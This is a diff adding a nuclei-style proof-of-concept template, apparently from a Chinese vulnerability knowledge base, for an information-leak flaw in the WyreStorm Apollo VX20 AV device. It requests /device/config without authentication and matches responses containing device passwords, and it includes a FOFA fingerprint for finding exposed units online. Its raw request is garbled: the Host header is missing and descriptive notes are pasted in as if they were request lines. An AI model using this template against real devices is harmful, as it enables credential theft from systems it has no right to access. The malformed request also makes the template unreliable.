@@ -1,0 +1,46 @@
+id: poc-sxlgi36v6giugutf
+info:
+  name: WyreStorm Apollo VX20 信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sxlgi36v6giugutf'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sxlgi36v6giugutf
+    fofa: icon_hash="-893957814"
+http:
+- raw:
+  - 'GET /device/config HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept: */*
+
+
+    Accept-Language: en
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?password)(?=.*?softAp).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
